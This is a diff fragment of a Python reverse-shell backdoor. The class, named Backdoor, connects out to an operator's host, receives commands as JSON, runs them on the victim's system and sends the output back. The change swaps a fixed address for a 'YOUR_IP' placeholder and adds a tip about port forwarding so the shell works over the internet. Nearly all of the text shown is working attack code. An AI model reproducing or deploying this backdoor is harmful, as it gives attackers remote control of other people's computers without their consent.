@@ -16,7 +16,7 @@
             self.connection.send(json_data.encode('utf-8'))
      
         def reliable_receive(self):
-            json_data = self.connection.recv(4096).decode('utf-8')
+            json_data = self.connection.recv(4096).decode('utf-8') #decoding byte like object into readable stuff
             return json.loads(json_data)
      
         def execute_system_commands(self, command):
@@ -29,5 +29,5 @@
                 self.reliable_send(data=command_result.decode('utf-8'))
             connection.close()
      
-    my_backdoor = Backdoor('192.168.1.3', 4444)
+    my_backdoor = Backdoor('YOUR_IP', "Port"); #Works also with public ip you should enable port forwarding in your router
     my_backdoor.run()
